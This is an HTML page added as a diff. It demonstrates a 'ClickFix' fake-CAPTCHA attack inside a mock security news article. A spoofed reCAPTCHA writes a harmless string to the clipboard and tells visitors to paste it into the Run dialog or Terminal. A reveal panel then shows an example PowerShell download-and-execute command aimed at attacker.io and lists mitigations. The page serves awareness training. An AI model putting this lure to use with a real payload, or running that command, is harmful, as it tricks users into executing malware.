@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Breaking: Security Researchers Expose Major Vulnerability — TechPulse Daily</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Georgia:ital,wght@0,400;1,400&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: Georgia, serif;
+      background: #f4f4f4;
+      color: #222;
+    }
+
+    /* ── Site Header ─────────────────────────────────────── */
+    .site-header {
+      background: #1a1a2e;
+      color: #fff;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .site-header .logo { font-size: 22px; font-weight: 700; letter-spacing: 1px; color: #e94560; }
+    .site-header nav a { color: #ccc; text-decoration: none; margin-left: 18px; font-family: Roboto, sans-serif; font-size: 14px; }
+    .site-header nav a:hover { color: #fff; }
+
+    /* ── Layout ──────────────────────────────────────────── */
+    .container {
+      max-width: 900px;
+      margin: 32px auto;
+      padding: 0 16px;
+      display: grid;
+      grid-template-columns: 1fr 280px;
+      gap: 32px;
+    }
+
+    /* ── Article ─────────────────────────────────────────── */
+    .article h1 { font-size: 28px; line-height: 1.3; margin-bottom: 10px; }
+    .article .byline { font-family: Roboto, sans-serif; font-size: 13px; color: #777; margin-bottom: 20px; }
+    .article p { line-height: 1.75; margin-bottom: 16px; font-size: 16px; }
+    .article p span.blur { filter: blur(4px); user-select: none; }
+
+    /* ── Paywall / Verification gate ─────────────────────── */
+    .gate {
+      position: relative;
+      margin-top: 24px;
+      overflow: hidden;
+    }
+    .gate-blur {
+      filter: blur(5px);
+      pointer-events: none;
+      user-select: none;
+      opacity: 0.6;
+    }
+    .gate-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(to bottom, transparent 0%, #f4f4f4 40%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-end;
+      padding-bottom: 32px;
+    }
+    .gate-label {
+      font-family: Roboto, sans-serif;
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    /* ── reCAPTCHA-style Widget ──────────────────────────── */
+    .recaptcha-widget {
+      width: 304px;
+      background: #f9f9f9;
+      border: 1px solid #d3d3d3;
+      border-radius: 3px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.15);
+      padding: 0;
+      font-family: Roboto, sans-serif;
+      user-select: none;
+    }
+    .recaptcha-body {
+      display: flex;
+      align-items: center;
+      padding: 14px 16px 14px 16px;
+      gap: 14px;
+    }
+    .recaptcha-checkbox-wrap {
+      width: 28px;
+      height: 28px;
+      flex-shrink: 0;
+      cursor: pointer;
+      position: relative;
+    }
+    .recaptcha-checkbox-wrap input[type="checkbox"] {
+      opacity: 0;
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      cursor: pointer;
+      position: absolute;
+      inset: 0;
+    }
+    .recaptcha-checkbox-visual {
+      width: 28px;
+      height: 28px;
+      border: 2px solid #c1c1c1;
+      border-radius: 2px;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: border-color .15s;
+      pointer-events: none;
+    }
+    .recaptcha-checkbox-wrap:hover .recaptcha-checkbox-visual { border-color: #4a90d9; }
+    .recaptcha-checkbox-visual .checkmark {
+      display: none;
+      width: 14px;
+      height: 14px;
+      stroke: #4a90d9;
+      stroke-width: 3;
+      fill: none;
+    }
+    .recaptcha-checkbox-wrap.checked .recaptcha-checkbox-visual { border-color: #4a90d9; }
+    .recaptcha-checkbox-wrap.checked .checkmark { display: block; }
+
+    /* spinner shown while "verifying" */
+    .recaptcha-checkbox-wrap.loading .recaptcha-checkbox-visual { border-color: #4a90d9; }
+    .spinner {
+      display: none;
+      width: 16px;
+      height: 16px;
+      border: 2.5px solid #d3d3d3;
+      border-top-color: #4a90d9;
+      border-radius: 50%;
+      animation: spin .6s linear infinite;
+    }
+    .recaptcha-checkbox-wrap.loading .spinner { display: block; }
+    .recaptcha-checkbox-wrap.loading .checkmark { display: none; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .recaptcha-label {
+      font-size: 14px;
+      color: #333;
+      flex: 1;
+    }
+    .recaptcha-logo-area {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 2px;
+      flex-shrink: 0;
+    }
+    .recaptcha-logo {
+      width: 32px;
+      height: 32px;
+    }
+    .recaptcha-brand {
+      font-size: 8px;
+      color: #999;
+      letter-spacing: .5px;
+    }
+
+    .recaptcha-footer {
+      border-top: 1px solid #e0e0e0;
+      background: #f1f1f1;
+      padding: 6px 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-radius: 0 0 3px 3px;
+    }
+    .recaptcha-footer a {
+      font-size: 10px;
+      color: #777;
+      text-decoration: none;
+    }
+    .recaptcha-footer a:hover { text-decoration: underline; }
+
+    /* ── Sidebar ─────────────────────────────────────────── */
+    .sidebar { font-family: Roboto, sans-serif; }
+    .sidebar-box {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+    .sidebar-box h3 { font-size: 13px; text-transform: uppercase; color: #999; letter-spacing: 1px; margin-bottom: 12px; }
+    .sidebar-box .trend-item { font-size: 14px; color: #333; padding: 8px 0; border-bottom: 1px solid #f0f0f0; cursor: pointer; }
+    .sidebar-box .trend-item:hover { color: #e94560; }
+    .sidebar-box .trend-item:last-child { border-bottom: none; }
+    .ad-box {
+      background: #fffbe6;
+      border: 1px solid #f0e68c;
+      border-radius: 4px;
+      padding: 16px;
+      font-size: 13px;
+      color: #888;
+      text-align: center;
+    }
+    .ad-box .ad-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+
+    /* ── Modal Overlay ───────────────────────────────────── */
+    .modal-backdrop {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,.55);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-backdrop.visible { display: flex; }
+
+    .modal {
+      background: #fff;
+      border-radius: 8px;
+      width: 480px;
+      max-width: calc(100vw - 32px);
+      box-shadow: 0 8px 40px rgba(0,0,0,.3);
+      font-family: Roboto, sans-serif;
+      overflow: hidden;
+    }
+    .modal-header {
+      background: #1a73e8;
+      color: #fff;
+      padding: 20px 24px 16px;
+    }
+    .modal-header .icon { font-size: 28px; margin-bottom: 6px; }
+    .modal-header h2 { font-size: 18px; font-weight: 500; }
+    .modal-header p { font-size: 13px; opacity: .85; margin-top: 4px; }
+
+    .modal-body { padding: 24px; }
+    .modal-body .step-intro { font-size: 14px; color: #555; margin-bottom: 20px; }
+
+    /* OS Tabs */
+    .os-tabs { display: flex; border-bottom: 2px solid #e0e0e0; margin-bottom: 20px; }
+    .os-tab {
+      padding: 8px 20px;
+      font-size: 14px;
+      font-weight: 500;
+      color: #777;
+      cursor: pointer;
+      border-bottom: 3px solid transparent;
+      margin-bottom: -2px;
+    }
+    .os-tab.active { color: #1a73e8; border-bottom-color: #1a73e8; }
+
+    .steps-panel { display: none; }
+    .steps-panel.active { display: block; }
+
+    .step {
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      margin-bottom: 16px;
+    }
+    .step-num {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: #1a73e8;
+      color: #fff;
+      font-size: 13px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .step-text { font-size: 14px; color: #333; line-height: 1.5; }
+    .step-text strong { color: #111; }
+    .key {
+      display: inline-block;
+      background: #f1f3f4;
+      border: 1px solid #c8c8c8;
+      border-radius: 4px;
+      padding: 1px 7px;
+      font-family: monospace;
+      font-size: 13px;
+      color: #333;
+      box-shadow: 0 1px 0 #bbb;
+    }
+
+    .modal-footer {
+      padding: 0 24px 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .btn-reveal {
+      width: 100%;
+      padding: 12px;
+      background: #34a853;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: Roboto, sans-serif;
+    }
+    .btn-reveal:hover { background: #2d9044; }
+
+    /* ── Reveal Panel ────────────────────────────────────── */
+    .reveal-panel {
+      display: none;
+      background: #1a1a2e;
+      color: #e0e0e0;
+      font-family: Roboto, sans-serif;
+    }
+    .reveal-panel.visible { display: block; }
+    .reveal-header {
+      background: #e94560;
+      padding: 16px 24px;
+      font-size: 15px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: .5px;
+    }
+    .reveal-body { padding: 20px 24px 24px; }
+    .reveal-body h3 { font-size: 13px; text-transform: uppercase; letter-spacing: 1px; color: #e94560; margin-bottom: 8px; }
+    .reveal-body p { font-size: 13px; line-height: 1.6; color: #ccc; margin-bottom: 16px; }
+    .code-block {
+      background: #0d1117;
+      border: 1px solid #333;
+      border-radius: 4px;
+      padding: 12px 14px;
+      font-family: monospace;
+      font-size: 12px;
+      color: #7ee787;
+      margin-bottom: 16px;
+      word-break: break-all;
+    }
+    .reveal-items { list-style: none; }
+    .reveal-items li {
+      font-size: 13px;
+      color: #ccc;
+      padding: 6px 0;
+      border-bottom: 1px solid #2a2a3e;
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+    }
+    .reveal-items li::before { content: "→"; color: #e94560; flex-shrink: 0; }
+    .reveal-items li:last-child { border-bottom: none; }
+    .btn-close {
+      margin-top: 8px;
+      width: 100%;
+      padding: 10px;
+      background: #333;
+      color: #ccc;
+      border: 1px solid #444;
+      border-radius: 4px;
+      font-size: 13px;
+      cursor: pointer;
+      font-family: Roboto, sans-serif;
+    }
+    .btn-close:hover { background: #444; }
+  </style>
+</head>
+<body>
+
+<!-- ══ Site Header ══════════════════════════════════════════ -->
+<header class="site-header">
+  <span class="logo">TechPulse Daily</span>
+  <nav>
+    <a href="#">News</a>
+    <a href="#">Security</a>
+    <a href="#">AI</a>
+    <a href="#">Dev</a>
+    <a href="#">Subscribe</a>
+  </nav>
+</header>
+
+<!-- ══ Main Layout ══════════════════════════════════════════ -->
+<div class="container">
+  <main class="article">
+    <p class="byline">Mar 28, 2026 &nbsp;·&nbsp; By Alex Rivera, Security Correspondent</p>
+    <h1>Researchers Expose Widespread Phishing Technique That Bypasses Modern Browser Defenses</h1>
+
+    <p>A coalition of cybersecurity researchers from three universities published findings this week detailing a sophisticated social-engineering campaign that has successfully compromised thousands of enterprise workstations despite the presence of modern endpoint detection tools.</p>
+
+    <p>The technique, which the researchers have dubbed <strong>"ClickFix"</strong>, relies on a deceptively simple premise: convincing users to manually execute commands they believe are harmless verification steps. Unlike traditional phishing attacks that require victims to open attachments or click suspicious links, ClickFix weaponizes the browser's native clipboard API to silently stage a payload before the victim is even aware anything has occurred.</p>
+
+    <p>"The genius — and the danger — is that the attacker never delivers the payload directly," said Dr. Priya Nair, lead author of the study. "The victim's own operating system executes it, triggered entirely by the victim's own keystrokes."</p>
+
+    <!-- ── Gated content with CAPTCHA ─────────────────────── -->
+    <div class="gate">
+      <div class="gate-blur">
+        <p>The attack begins when a user visits a compromised or attacker-controlled website. The page presents what appears to be a standard bot-verification widget — visually indistinguishable from the reCAPTCHA components embedded on millions of legitimate sites. When the user clicks the familiar "I'm not a robot" checkbox, the page silently invokes <code>navigator.clipboard.writeText()</code> with a malicious command string.</p>
+        <p>In the campaigns the researchers analyzed, that command was typically a PowerShell one-liner designed to download and execute a second-stage dropper from an attacker-controlled CDN. The commands were obfuscated using base64 encoding and executed with the <code>-WindowStyle Hidden</code> flag, ensuring no console window appeared to alert the victim.</p>
+        <p>What followed was the social engineering masterstroke: a modal dialog, again styled to match a familiar verification UI, instructed the user to "complete verification" by pressing a keyboard shortcut — on Windows, <kbd>Win+R</kbd> to open the Run dialog, followed by <kbd>Ctrl+V</kbd> and <kbd>Enter</kbd>. On macOS, the equivalent steps used Spotlight or Terminal. The entire sequence, from clipboard write to command execution, took less than fifteen seconds.</p>
+      </div>
+      <div class="gate-overlay">
+        <p class="gate-label">Continue reading — verify you're human to access the full article</p>
+
+        <!-- ── reCAPTCHA-style Widget ──────────────────────── -->
+        <div class="recaptcha-widget">
+          <div class="recaptcha-body">
+            <div class="recaptcha-checkbox-wrap" id="captchaWrap">
+              <input type="checkbox" id="captchaCheck" aria-label="I'm not a robot" />
+              <div class="recaptcha-checkbox-visual">
+                <svg class="checkmark" viewBox="0 0 14 14">
+                  <polyline points="2,7 5.5,11 12,3" />
+                </svg>
+                <div class="spinner" id="spinner"></div>
+              </div>
+            </div>
+            <label class="recaptcha-label" for="captchaCheck">I'm not a robot</label>
+            <div class="recaptcha-logo-area">
+              <!-- reCAPTCHA shield SVG (simplified) -->
+              <svg class="recaptcha-logo" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M32 4L8 16v16c0 13.3 10.3 25.7 24 29 13.7-3.3 24-15.7 24-29V16L32 4z" fill="#4a90d9"/>
+                <path d="M32 4L8 16v16c0 13.3 10.3 25.7 24 29V4z" fill="#357abd"/>
+                <path d="M22 32l7 7 13-14" stroke="#fff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <span class="recaptcha-brand">reCAPTCHA</span>
+            </div>
+          </div>
+          <div class="recaptcha-footer">
+            <span style="font-size:10px;color:#999;">Protected by reCAPTCHA</span>
+            <span>
+              <a href="#">Privacy</a> &nbsp;·&nbsp; <a href="#">Terms</a>
+            </span>
+          </div>
+        </div>
+        <!-- end widget -->
+
+      </div>
+    </div>
+    <!-- end gate -->
+
+  </main>
+
+  <!-- ══ Sidebar ════════════════════════════════════════════ -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <h3>Trending</h3>
+      <div class="trend-item">GitHub Actions supply-chain attack hits 100+ repos</div>
+      <div class="trend-item">EU mandates passkey support for banking apps by 2027</div>
+      <div class="trend-item">CVE-2026-1337: Critical RCE in popular npm package</div>
+      <div class="trend-item">Why your EDR missed the last breach</div>
+    </div>
+    <div class="ad-box">
+      <div class="ad-label">Sponsored</div>
+      <strong style="font-size:14px;color:#555;">Protect your org with zero-trust identity</strong><br/>
+      <a href="#" style="color:#1a73e8;font-size:13px;text-decoration:none;">Learn more →</a>
+    </div>
+    <div class="sidebar-box">
+      <h3>Newsletter</h3>
+      <p style="font-size:13px;color:#555;margin-bottom:10px;">Weekly threat intel, no spam.</p>
+      <input style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;font-size:13px;margin-bottom:8px;" type="email" placeholder="your@email.com" />
+      <button style="width:100%;padding:8px;background:#1a1a2e;color:#fff;border:none;border-radius:4px;font-size:13px;cursor:pointer;">Subscribe</button>
+    </div>
+  </aside>
+</div>
+
+<!-- ══ Verification Modal ════════════════════════════════════ -->
+<div class="modal-backdrop" id="modalBackdrop">
+  <div class="modal" id="mainModal">
+
+    <!-- Non-reveal state -->
+    <div id="verifyPane">
+      <div class="modal-header">
+        <div class="icon">🛡️</div>
+        <h2>Additional Verification Required</h2>
+        <p>Our systems detected unusual activity. Please complete the steps below to unlock the article.</p>
+      </div>
+
+      <div class="modal-body">
+        <p class="step-intro">To confirm you're human, follow the one-time verification steps for your operating system:</p>
+
+        <div class="os-tabs">
+          <div class="os-tab active" data-panel="windows">Windows</div>
+          <div class="os-tab" data-panel="mac">macOS</div>
+        </div>
+
+        <!-- Windows steps -->
+        <div class="steps-panel active" id="panel-windows">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-text">Press <span class="key">⊞ Win</span> + <span class="key">R</span> on your keyboard to open the <strong>Run</strong> dialog.</div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-text">Press <span class="key">Ctrl</span> + <span class="key">V</span> to paste the verification token that was copied to your clipboard.</div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-text">Press <span class="key">Enter</span> to complete verification.</div>
+          </div>
+        </div>
+
+        <!-- macOS steps -->
+        <div class="steps-panel" id="panel-mac">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-text">Press <span class="key">⌘ Cmd</span> + <span class="key">Space</span> to open <strong>Spotlight</strong>.</div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-text">Type <strong>Terminal</strong> and press <span class="key">Enter</span> to open the terminal.</div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-text">Press <span class="key">⌘ Cmd</span> + <span class="key">V</span> then <span class="key">Enter</span> to paste and run the verification token.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-footer">
+        <button class="btn-reveal" id="btnReveal">⚠ Reveal what just happened (demo)</button>
+      </div>
+    </div>
+
+    <!-- Reveal state -->
+    <div class="reveal-panel" id="revealPane">
+      <div class="reveal-header">🔴 DEMO REVEAL — This was a fake CAPTCHA attack</div>
+      <div class="reveal-body">
+
+        <h3>What was silently written to your clipboard</h3>
+        <div class="code-block" id="clipboardDisplay">hey I wrote to your clipboard</div>
+
+        <h3>In a real attack, it would look like</h3>
+        <div class="code-block">powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://attacker.io/payload.ps1')"</div>
+
+        <h3>Why it works</h3>
+        <ul class="reveal-items">
+          <li>The CAPTCHA widget is pixel-perfect — visually identical to Google reCAPTCHA</li>
+          <li>Clipboard write happens silently on checkbox click — no browser prompt on most origins</li>
+          <li>The "verification steps" reframe a dangerous action (run a shell command) as a routine task</li>
+          <li>Social pressure ("unusual activity detected") overrides the victim's scepticism</li>
+          <li>The payload executes inside a trusted OS process — EDR/AV telemetry often misses it</li>
+          <li>No malicious file is downloaded by the browser — no URL-based detection fires</li>
+        </ul>
+
+        <h3>Mitigations</h3>
+        <ul class="reveal-items">
+          <li>User awareness: no legitimate CAPTCHA ever asks you to run shell commands</li>
+          <li>Browser extensions can block <code>navigator.clipboard.writeText</code> on suspicious origins</li>
+          <li>Restrict <code>Win+R</code> / Run dialog via Group Policy in enterprise environments</li>
+          <li>Monitor for clipboard-triggered process spawns (PowerShell / cmd launched with pasted args)</li>
+        </ul>
+
+        <button class="btn-close" id="btnClose">Close</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══ Script ════════════════════════════════════════════════ -->
+<script>
+  const wrap     = document.getElementById('captchaWrap');
+  const check    = document.getElementById('captchaCheck');
+  const backdrop = document.getElementById('modalBackdrop');
+  const tabs     = document.querySelectorAll('.os-tab');
+  const btnReveal = document.getElementById('btnReveal');
+  const btnClose  = document.getElementById('btnClose');
+  const verifyPane = document.getElementById('verifyPane');
+  const revealPane = document.getElementById('revealPane');
+
+  const PAYLOAD = "hey I wrote to your clipboard";
+
+  check.addEventListener('change', function () {
+    if (!this.checked) return;
+
+    // Show loading spinner
+    wrap.classList.add('loading');
+
+    // Silently write to clipboard
+    navigator.clipboard.writeText(PAYLOAD)
+      .then(() => {
+        // Small delay to mimic "verification" feel
+        setTimeout(() => {
+          wrap.classList.remove('loading');
+          wrap.classList.add('checked');
+          // Show modal after brief pause
+          setTimeout(() => {
+            backdrop.classList.add('visible');
+          }, 500);
+        }, 1200);
+      })
+      .catch(() => {
+        // Clipboard permission denied — still show modal for demo purposes
+        wrap.classList.remove('loading');
+        wrap.classList.add('checked');
+        document.getElementById('clipboardDisplay').textContent =
+          "(Clipboard write was blocked by the browser — would succeed on a real attacker page served over HTTPS)";
+        setTimeout(() => backdrop.classList.add('visible'), 500);
+      });
+  });
+
+  // OS tabs
+  tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+      tabs.forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+      document.querySelectorAll('.steps-panel').forEach(p => p.classList.remove('active'));
+      document.getElementById('panel-' + tab.dataset.panel).classList.add('active');
+    });
+  });
+
+  // Reveal button
+  btnReveal.addEventListener('click', () => {
+    verifyPane.style.display = 'none';
+    revealPane.classList.add('visible');
+  });
+
+  // Close button
+  btnClose.addEventListener('click', () => {
+    backdrop.classList.remove('visible');
+    // Reset for re-demo
+    verifyPane.style.display = '';
+    revealPane.classList.remove('visible');
+    wrap.classList.remove('checked', 'loading');
+    check.checked = false;
+  });
+</script>
+</body>
+</html>
